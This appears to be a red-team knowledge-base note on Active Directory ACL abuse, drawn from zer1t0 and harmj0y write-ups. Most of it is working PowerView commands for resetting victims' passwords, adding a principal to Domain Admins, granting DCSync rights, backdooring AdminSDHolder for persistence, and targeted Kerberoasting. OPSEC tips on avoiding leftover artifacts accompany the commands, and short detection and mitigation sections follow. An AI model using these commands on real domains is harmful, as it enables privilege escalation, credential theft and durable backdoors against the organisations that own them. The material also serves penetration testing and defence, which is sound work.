---
title: ACL Abuse
aliases: ["ACL abuse", "ACE abuse", "DACL backdoor"]
type: technique
domain: [red-team]
attack_tactic: [privesc, persistence]
tags: [type/technique, domain/red-team, attack/privesc]
source:
  - "[[Source - zer1t0 - Attacking Active Directory]]"
  - "[[Source - harmj0y blog]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[ACL, ACE, DACL, SACL]]", "[[AdminSDHolder]]", "[[DCSync]]", "[[Resource-Based Constrained Delegation (RBCD)]]", "[[BloodHound enumeration]]", "[[Kerberoasting]]", "[[AS-REP Roasting]]", "[[PowerView]]", "[[Rubeus]]", "[[UserAccountControl]]"]
created: 2026-06-06
updated: 2026-06-07
---

# ACL Abuse

> [!summary] One-liner
> Exploit a dangerous permission you hold over an AD object (reset its password, add yourself to a group, grant DCSync, take it over) to escalate.

## Concept abused
Misconfigured ACEs in [[ACL, ACE, DACL, SACL|DACLs]] grant low-privilege principals powerful rights over high-value objects.

## Prerequisites
- An ACE granting you GenericAll/GenericWrite/WriteDACL/WriteOwner/ForceChangePassword/etc. over a target.

## Common abuses & commands (PowerView)
```powershell
# ForceChangePassword - reset a user's password
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)

# GenericWrite on a user -> set SPN -> Kerberoast (targeted)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}

# Self / GenericWrite on a group -> add yourself
Add-DomainGroupMember -Identity 'Domain Admins' -Members me

# WriteDACL -> grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=contoso,DC=local' -PrincipalIdentity me -Rights DCSync

# WriteOwner -> become owner, then WriteDACL
Set-DomainObjectOwner -Identity victim -OwnerIdentity me
```
- **GenericWrite/GenericAll on a computer** → set RBCD → [[Resource-Based Constrained Delegation (RBCD)]].
- **WriteDACL on the domain root** → grant **DS-Replication-Get-Changes** → [[DCSync]].
- **Modify [[AdminSDHolder]]** → persistence on all admins.

## Tooling for finding paths
- **[[BloodHound enumeration]]** maps these as graph edges (the fastest way to find ACL paths).

## Detection / artifacts
Directory object modifications (5136), ACL changes on sensitive objects, password resets, new group members.

## Mitigation
Least-privilege ACLs, monitor changes to Tier-0 objects/AdminSDHolder, audit DACL edits.

## More from harmj0y (Abusing AD permissions with PowerView)

harmj0y's "Abusing Active Directory Permissions with PowerView" walks the full enumerate → abuse → persist loop using the older PowerView function names. (Note: `Get-ObjectACL` / `Add-ObjectACL` are the classic names; newer PowerView ships `Get-DomainObjectAcl` / `Add-DomainObjectAcl` as the equivalents used above.)

### Enumerating ACLs and finding privileged targets
```powershell
# Dump the ACL of an object, resolving extended-right GUIDs to readable names
Get-ObjectACL -SamAccountName <user> -ResolveGUIDs

# Who has rights over the Domain Admins group?
Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match '<username>'}

# Find every account/group flagged AdminCount=1 (current or former protected-group members)
Get-NetUser  -AdminCount
Get-NetGroup -AdminCount
```
- **AdminCount=1** marks accounts that were/are members of protected groups; it *persists even after removal* from the privileged group, so it is a high-signal way to locate Tier-0 targets. Protected groups (Domain Admins, Enterprise Admins, etc.) get their ACLs re-stamped automatically by SDProp.

### Granting rights with Add-ObjectACL
`-Rights` accepts shorthand values: `ResetPassword`, `WriteMembers`, `All` (= GenericAll), and `DCSync`. Targets via `-TargetSamAccountName` / `-TargetName` / `-TargetDistinguishedName` / `-TargetADSprefix`; principal via `-PrincipalSamAccountName` / `-PrincipalName` / `-PrincipalSID`.
```powershell
# Delegate password-reset rights over a target user (no current creds needed afterward)
Add-ObjectACL -TargetSamAccountName <target> -PrincipalSamAccountName <attacker> -Rights ResetPassword

# Grant DCSync rights (DS-Replication-Get-Changes + -All) on the domain head to an unprivileged user
Add-ObjectACL -TargetDistinguishedName "dc=domain,dc=com" -PrincipalSamAccountName <attacker> -Rights DCSync
```
The `DCSync` shorthand applies these extended-right GUIDs:
- `DS-Replication-Get-Changes` = `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- `DS-Replication-Get-Changes-All` = `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- `DS-Replication-Get-Changes-In-Filtered-Set` = `89e95b76-444d-4c62-991a-0facbeda640c`

Once granted, the unprivileged user can run [[DCSync]] to pull hashes from a DC without being in any admin group or having local admin on the DC.

### AdminSDHolder persistence (SDProp)
`CN=AdminSDHolder,CN=System,DC=domain,DC=com` is a template object whose DACL is cloned onto every protected object by the **SDProp** process (runs ~every 60 minutes by default). Adding a backdoor ACE here propagates GenericAll over Domain Admins / Enterprise Admins / etc.
```powershell
# Backdoor AdminSDHolder -> full control of all protected accounts (re-applied by SDProp)
Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <attacker> -Rights All -Verbose

# Audit it (defenders): review the AdminSDHolder DACL
Get-ObjectACL -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs
```

### OPSEC / prerequisites
- Changing these permissions requires you to already hold elevated/write rights over the target object — this is escalation/persistence *from* an existing foothold, not initial access.
- AdminSDHolder is a durable backdoor: even if defenders strip your ACE from a specific admin object, SDProp re-applies it from the template within ~60 min until the template itself is cleaned.

## More from harmj0y (Targeted Kerberoasting)

If you hold **GenericWrite** or **GenericAll** over a target *user* (but not its password), you can temporarily plant a fake SPN on it, [[Kerberoasting|Kerberoast]] it, then remove the SPN — extracting a crackable hash without a destructive password reset. harmj0y: "Given modification rights on a target, we can change the user's serviceprincipalname to _any_ SPN we want (even something fake), Kerberoast the service ticket, and then repair the serviceprincipalname value."

### Command sequence (PowerView)
```powershell
# 1. Record the existing SPN(s) so you can restore exactly (often there are none)
Get-DomainUser <victimuser> | Select serviceprincipalname

# 2. Set a throwaway SPN
Set-DomainObject -Identity <victimuser> -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

# 3. Request and dump the roastable ticket
$User = Get-DomainUser <victimuser>
$User | Get-DomainSPNTicket | fl

# 4. (optional) Verify the SPN took
$User | Select serviceprincipalname

# 5. CLEANUP: clear the temporary SPN
Set-DomainObject -Identity <victimuser> -Clear serviceprincipalname
```
Crack the resulting hash offline with Hashcat / John (standard [[Kerberoasting]] modes). [[Rubeus]] can perform the equivalent roast (`Rubeus.exe kerberoast /user:<victimuser>`).

### Related ACL-based credential paths (same write-rights primitive)
- **Targeted [[AS-REP Roasting]]** — instead of an SPN, flip the target's [[UserAccountControl]] to disable Kerberos pre-auth (`DONT_REQ_PREAUTH`), capture the AS-REP, then restore the UAC value.
- **Reversible-encryption downgrade** — with sufficient rights, set the account to store its password with reversible encryption, then [[DCSync]] to recover the plaintext (requires a password change/reset to take effect; more destructive).

### OPSEC
- Non-destructive vs. a password reset: the target user is unaffected and unaware.
- Always restore/clear the SPN (step 5) — a lingering fake SPN is an obvious artifact.
- Only useful if the account has a weak/crackable password; pointless once you already hold Domain Admin.
- When SPN-modification auditing is enabled, the temporary `servicePrincipalName` change is detectable (directory object modification, event 5136).

## Detection / artifacts (additional)
- Event 5136 on `servicePrincipalName` and `userAccountControl` modifications (targeted Kerberoasting / AS-REP roasting set-then-clear pattern).
- DACL changes on AdminSDHolder and the domain head; unexpected ACEs surfaced via `Get-ObjectACL ... -ResolveGUIDs`.
- New principals holding DS-Replication-Get-Changes(-All) on the domain object → DCSync precursor.

## Related
- [[ACL, ACE, DACL, SACL]] · [[AdminSDHolder]] · [[DCSync]] · [[Resource-Based Constrained Delegation (RBCD)]] · [[Kerberoasting]] · [[AS-REP Roasting]] · [[UserAccountControl]] · [[PowerView]] · [[Rubeus]] · [[BloodHound enumeration]]

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "ACL attacks"
- [[Source - harmj0y blog]] — "Abusing Active Directory Permissions with PowerView" — https://blog.harmj0y.net/redteaming/abusing-active-directory-permissions-with-powerview/
- [[Source - harmj0y blog]] — "Targeted Kerberoasting" — https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/
